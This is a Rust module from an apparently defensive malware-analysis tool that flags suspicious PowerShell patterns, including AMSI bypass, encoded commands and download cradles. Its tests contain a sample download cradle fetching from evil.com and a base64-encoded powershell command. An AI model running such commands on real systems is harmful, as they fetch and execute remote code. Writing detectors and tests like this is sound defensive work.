// PowerShell script static analysis
// Detection patterns loaded from private scoring crate.

use crate::output::PowerShellAnalysis;
use anya_scoring::detection_patterns::PS_SUSPICIOUS_PATTERNS;
use regex::Regex;
use std::sync::LazyLock;

/// Pattern indices matching PS_SUSPICIOUS_PATTERNS order
const IDX_ENCODED_CMD: usize = 0;
const IDX_IEX: usize = 1;
const IDX_INVOKE_WEB: usize = 2;
const IDX_WEBCLIENT: usize = 3;
const IDX_BITS_TRANSFER: usize = 4;
const IDX_FROMBASE64: usize = 5;
const IDX_ASSEMBLY_LOAD: usize = 6;
const IDX_AMSI_BYPASS: usize = 7;
const IDX_COM_OBJECT: usize = 8;
const IDX_ADD_TYPE: usize = 9;
const IDX_SCHTASKS: usize = 10;
const IDX_BYPASS_EXEC: usize = 11;
const IDX_HIDDEN_WINDOW: usize = 12;

static PS_COMPILED: LazyLock<Vec<Option<Regex>>> = LazyLock::new(|| {
    PS_SUSPICIOUS_PATTERNS
        .iter()
        .map(|pat| Regex::new(pat).ok())
        .collect()
});

fn matches(idx: usize, text: &str) -> bool {
    PS_COMPILED
        .get(idx)
        .and_then(|r| r.as_ref())
        .is_some_and(|r| r.is_match(text))
}

/// Analyse file bytes as PowerShell script.
pub fn detect_powershell_analysis(data: &[u8]) -> Option<PowerShellAnalysis> {
    let text = match std::str::from_utf8(data) {
        Ok(s) => s,
        Err(_) => return None,
    };

    let has_encoded_command = matches(IDX_ENCODED_CMD, text);
    let has_amsi_bypass = matches(IDX_AMSI_BYPASS, text);
    let has_reflection = matches(IDX_ASSEMBLY_LOAD, text) || matches(IDX_ADD_TYPE, text);
    let has_download_cradle = matches(IDX_INVOKE_WEB, text)
        || matches(IDX_WEBCLIENT, text)
        || matches(IDX_BITS_TRANSFER, text);

    let mut cmdlets: Vec<String> = Vec::new();
    let mut obf: Vec<String> = Vec::new();

    let labels = [
        (IDX_IEX, "Invoke-Expression"),
        (IDX_INVOKE_WEB, "Invoke-WebRequest"),
        (IDX_WEBCLIENT, "Net.WebClient"),
        (IDX_BITS_TRANSFER, "Start-BitsTransfer"),
        (IDX_FROMBASE64, "FromBase64String"),
        (IDX_ASSEMBLY_LOAD, "Assembly::Load"),
        (IDX_COM_OBJECT, "COM object creation"),
        (IDX_SCHTASKS, "Scheduled task creation"),
        (IDX_BYPASS_EXEC, "Execution policy bypass"),
        (IDX_HIDDEN_WINDOW, "Hidden window execution"),
    ];

    for (idx, label) in &labels {
        if matches(*idx, text) {
            cmdlets.push(label.to_string());
        }
    }

    if has_encoded_command {
        obf.push("Base64-encoded command parameter".into());
    }

    if cmdlets.is_empty() && obf.is_empty() && !has_encoded_command && !has_amsi_bypass {
        return None;
    }

    Some(PowerShellAnalysis {
        has_encoded_command,
        has_download_cradle,
        has_amsi_bypass,
        has_reflection,
        obfuscation_indicators: obf,
        suspicious_cmdlets: cmdlets,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_clean_ps() {
        let code = b"Get-Process | Format-Table Name, Id";
        assert!(detect_powershell_analysis(code).is_none());
    }

    #[test]
    fn test_encoded_command() {
        let code = b"powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0";
        let r = detect_powershell_analysis(code).unwrap();
        assert!(r.has_encoded_command);
    }

    #[test]
    fn test_download_cradle() {
        let code = b"(New-Object Net.WebClient).DownloadString('http://evil.com/payload')";
        let r = detect_powershell_analysis(code).unwrap();
        assert!(r.has_download_cradle);
    }
}
